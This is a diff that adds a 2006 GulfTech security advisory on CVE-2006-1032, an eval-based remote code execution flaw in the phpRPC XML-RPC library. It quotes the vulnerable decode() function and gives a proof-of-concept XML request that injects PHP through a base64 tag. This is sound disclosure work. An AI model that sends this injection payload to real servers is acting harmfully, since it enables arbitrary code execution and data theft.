@@ -1,0 +1,65 @@
+phpRPC Remote Code Execution
+
+Vendor: Robert Hoffman
+Product: phpRPC
+Version: <= 0.7
+Website: http://sourceforge.net/projects/phprpc/
+
+BID: 16833 
+CVE: CVE-2006-1032 
+OSVDB: 23514 
+SECUNIA: 19028 
+PACKETSTORM: 44267 
+
+Description:
+phpRPC is meant to be an easy to use xmlrpc library. phpRPC is greatly simplified with the use of database/rpc-protocol abstraction. It should run on any php server with most data bases. Unfortunately, there is a easily exploitable remote php code execution vulnerability in the phpRPC library that allows an attacker to execute arbitrary code on the affected webserver. This vulnerability, like previously discovered vulnerabilities in various implementations of the XMLRPC protocol is possible because of unsanitized data being passed to an eval call. This of course could ultimately lead to a compromise of the under lying web server, and disclosure of sensitive data. 
+
+
+Remote Code Execution:
+There is a very serious, easy to exploit remote code execution issue in the phpRPC library. This issue takes place in the file rpc_decoder.php within the decode() function. This function is basically responsible for decoding the incoming XML data into php readable data that can be used by the application. 
+
+/**
+* Tells the decoder to process the xml data
+*
+* Used internaly but can also be used to send xml data to the decoder
+* @param string $data Transforms $data into a php readable array
+* @return array Returns an array containing the extracted data
+*/
+function decode($data) {
+
+$this->parser = xml_parser_create($this->encoding);
+
+	xml_set_object($this->parser, &$this);
+	xml_set_element_handler($this->parser, "tag_open", "tag_close");
+	xml_set_character_data_handler($this->parser, "cdata");
+	xml_parser_set_option($this->parser, XML_OPTION_SKIP_WHITE, 1);
+	xml_parser_set_option($this->parser, XML_OPTION_CASE_FOLDING, 1);
+	xml_parser_set_option($this->parser, XML_OPTION_TARGET_ENCODING, $this->encoding);
+	xml_parse($this->parser, $data);
+	xml_parser_free($this->parser);
+
+if ($this->debug == 1) { $this->dump(); }
+eval($this->code);
+return $params;
+}
+
+The variable $this->code in our case is constructed by the cdata() function, and is never sanitized when placed within a base64 tag. I guess this is because it is assumed that the data will be base64 encrypted and thus harmless, but the base64_decode call isn't really executed until AFTER the vulnerable eval call parses the data within "$this->code". 
+<?xml version="1.0"?>
+<methodCall>
+<methodName>test.method
+	<params>
+		<param>
+		<value><base64>'));phpinfo();exit;
+		</param>
+	</params>
+</methodCall>
+
+The above xml request sent to the phpRPC server would successfully execute the phpinfo() function, but this could just as easily have been some malicious payload. The phpRPC library is not as popular as other php XMLRPC implementations, but it is used fairly often and in popular open source projects such as runcms and exoops. 
+
+
+Solution:
+Several attempts to contact the developers were made, but according to the current exoops webmaster the phpRPC author stopped maintaining the project around 2004. Also, runcms were contacted as far back as July/August 2005 about this issue, and did respond confirming they would look in to it. However, as of last time I checked runcms still contained the vulnerable phpRPC libraries. Since there is no patch to be released, and since the project is seemingly un maintained all users are encourage to quit using the phpRPC library until a patch becomes publicly available. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
